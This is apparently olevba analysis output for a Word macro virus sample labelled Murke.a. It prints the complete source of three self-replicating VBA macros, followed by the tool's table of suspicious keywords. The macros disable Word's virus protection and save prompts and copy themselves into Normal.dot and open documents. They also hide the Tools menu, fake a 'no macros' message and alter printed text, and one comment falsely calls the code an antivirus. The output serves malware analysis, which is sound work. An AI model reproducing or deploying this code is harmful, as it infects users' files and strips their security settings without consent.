olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Murke.a-1f0c4852e2daa623ae4abf9f75e8199e79eedd49
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Murke.a-1f0c4852e2daa623ae4abf9f75e8199e79eedd49 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'*************************************************************************
'Murka - Это самый маленький из всех известных МакроАнтивирусных модулей!
'Принцип действия: Загружается вместе с документом и блокирует
'                 распространение зараженных модулей
'
'Условия распространения: Freeware(Свободно)
'Достоинства:             Корректная работа, надежность!
'Недостатки:              Пока не нашел
'
'"Все это, конечно, хорошо, но я ни хрена не понял, как его
' можно преобрести?!" - гневно скажешь ты. Можно!
'Дед MustDie вам все раскажет!
'Необходимо лишь открыть документ на персональном
'компе. где уже установлен антивирусный модуль Murka.
'
'Автору:   mustdie@chat.ru
'Murke:    murka@chat.ru
'Данилову: antivir@dials.ru
'*************************************************************************
On Error Resume Next
Dim s As Boolean
Dim i As Long
Dim j As Long
Dim Murka As String
Dim Other As String
Dim str As String
  s = ActiveDocument.Saved
  Application.EnableCancelKey = wdCancelDisabled
  With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
  str = "Document_Close"
  With MacroContainer.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Murka = .Lines(i, j)
  End With
  With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Other = .Lines(i, j)
    If Other <> Murka And Murka <> "" Then
      .DeleteLines i, j
      .InsertLines 1, Murka
      NormalTemplate.Save
    End If
  End With
  With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Other = .Lines(i, j)
    If Other <> Murka And Murka <> "" Then
      .DeleteLines i, j
      .InsertLines 1, Murka
      Randomize
      If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Murka3": .Author = "M&M": .Execute: End With
      If Left(ActiveDocument.Name, 8) = "Document" Or Left(ActiveDocument.Name, 8) = "Документ" Then
      Else
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
      End If
    End If
  End With
  If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
-------------------------------------------------------------------------------
VBA MACRO TheSecond.bas 
in file: Virus.MSWord.Murke.a-1f0c4852e2daa623ae4abf9f75e8199e79eedd49 - OLE stream: 'Macros/VBA/TheSecond'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
  Copyrights = "The Second, 2000"
  NickName = "Revenger"
  Options.VirusProtection = False
  flag = False
  If Documents.Count >= 1 Then
    counter = NormalTemplate.VBProject.VBComponents.Count
    For i = 1 To counter
      If NormalTemplate.VBProject.VBComponents.Item(i).Name = "TheSecond" Then flag = True
    Next i
    x = Application.StartupPath + "\TheSecond.tmp"
    If Not flag Then
      ActiveDocument.VBProject.VBComponents("TheSecond").Export (x)
      NormalTemplate.VBProject.VBComponents.Import (x)
    End If
    flag = False
    infected = False
    havesave = ActiveDocument.Saved
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents.Item(i).Name = "TheSecond" Then flag = True
    Next i
    If Not flag Then
      NormalTemplate.VBProject.VBComponents("TheSecond").Export (x)
      ActiveDocument.VBProject.VBComponents.Import (x)
      infected = True
    End If
    If havesave And infected And (Left(ActiveDocument.Name, 8) <> "Документ") Then
      Dialogs(wdDialogFileSaveAs).Execute
    End If
    ActiveDocument.Saved = havesave
  End If
End Sub
Sub FilePrint()
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "Нюбин"
    .Replacement.Text = "Нудин"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
  Dialogs(wdDialogFilePrint).Show
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "Нудин"
    .Replacement.Text = "Нюбин"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
End Sub
Sub ToolsMacro()
  Dialogs(wdDialogToolsMacro).Display
End Sub
Sub ViewVBCode()
  MsgBox ("Нет загруженных макросов!")
End Sub
-------------------------------------------------------------------------------
VBA MACRO bdoc2.bas 
in file: Virus.MSWord.Murke.a-1f0c4852e2daa623ae4abf9f75e8199e79eedd49 - OLE stream: 'Macros/VBA/bdoc2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(i).Name = "bdoc2" Then NormInstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "bdoc2" Then ActivInstall = True
Next i
If ActivInstall = True And NormInstall = True Then GoTo Label_Exit
If ActivInstall = True And NormInstall = False Then Set Doc = ActiveDocument
If ActivInstall = False And NormInstall = True Then Set Doc = NormalTemplate
Doc.VBProject.VBComponents("bdoc2").Export ("c:\bdoc2.txt")

If ActiveInstall = True And NormInstall = False Then
NormalTemplate.VBProject.VBComponents.Import ("c:\bdoc2.txt")
NormalTemplate.Save
Else
Dname = ActiveDocument.FullName
If Left$(Dname, 8) = "Document" Then GoTo Label_Exit
ActiveDocument.VBProject.VBComponents.Import ("c:\bdoc2.txt")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If

Label_Exit:
CommandBars("Tools").Enabled = False
Application.ScreenUpdating = True
Application.DisplayAlerts = wdAlertsAll
Application.EnableCancelKey = wdCancelInterrupt
End Sub
Sub AutoClose()
On Error Resume Next
If Day(Now) = 2 And Month(Now) = 9 Then MsgBox "УАФ¶µДЧЈёЈ , ЙъИХїмАЦ!!!", vbCritical
Application.DisplayAlerts = wdAlertsNone
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "bdoc2" Then NormInstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "bdoc2" Then ActiveInstall = True
Next i
If ActiveInstall = True And NormInstall = True Then GoTo Label_Exit
If ActiveInstall = True And NormInstall = False Then
NormalTemplate.VBProject.VBComponents.Import ("c:\bdoc2.txt")
NormalTemplate.Save
Else
Dname = ActiveDocument.FullName
If Left$(Dname, 8) = "Document" Then GoTo Label_Exit
ActiveDocument.VBProject.VBComponents.Import ("c:\bdoc2.txt")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
Label_Exit:
End Sub

Public Sub AutoExec()
On Error Resume Next
CommandBars("Tools").Enabled = False
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
Options.VirusProtection = False
End Sub
Sub AutoExit()
On Error Resume Next
Kill ("c:\bdoc2.txt")
If Day(Now) = 13 Then MsgBox "ЗлК№УГµБ°жИнјю,Press OK!!", vbCritical
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

